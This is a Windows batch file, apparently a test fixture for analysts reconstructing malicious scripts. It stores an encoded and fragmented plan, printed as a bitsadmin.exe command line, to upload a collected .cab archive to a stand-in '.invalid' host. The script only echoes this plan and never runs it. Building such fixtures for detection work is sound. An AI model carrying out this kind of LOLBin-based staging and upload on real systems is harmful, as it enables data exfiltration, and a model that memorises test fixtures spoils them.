@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:hex_pairs|identity
rem HUNTRESS-MATERIAL:763d317c73746570733d6c6f636174655f6c6f63616c2c707265706172655f7472616e736665722c75706c6f61645f72656d6f74657c616461707465723d6269747361646d696e2e6578657c73746167655f636f756e743d317c67726170683d6c696e6561727c6e6578745f6c616e67756167653d6e6f6e657c63616d706169676e5f69643d63616d706169676e2d303834313635326233317c736f757263655f706174683d433a5c55736572735c5075626c69635c48756e74726573734c61625c636f6c6c6563742d303834313635326233312e6361627c75706c6f61645f75726c3d68747470733a2f2f303834313635326233312e6578616d706c652e696e76616c69642f75706c6f6164
rem analyst reconstruction fixture
rem HUNTRESS-EXTENSION:bat
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set "FrAg0=v=1|steps=locate_local,prepare_transfer,upload_remote|adapter=bitsad"
set "FrAg1=min.exe|stage_count=1|graph=linear|next_language=none|campaign_id=ca"
set "FrAg2=mpaign-0841652b31|source_path=C:\Users\Public\HuntressLab\collect-08"
set "FrAg3=41652b31.cab|upload_url=https://0841652b31.example.invalid/upload"
goto :HUNTRESS_SEPARATOR_DONE
echo HUNTRESS_SEPARATOR | findstr HUNTRESS >nul
:HUNTRESS_SEPARATOR_DONE
set "neutral_arithmetic=ffaff2a3"
set "HUNTRESS_READY=1"
if defined HUNTRESS_READY set "ReCoVeReD=%FrAg0%%FrAg1%%FrAg2%%FrAg3%"
echo(!ReCoVeReD!
exit /b 0
:HUNTRESS_PLAN
echo bitsadmin.exe upload C:\Users\Public\HuntressLab\collect-0841652b31.cab to https://0841652b31.example.invalid/upload
exit /b 0
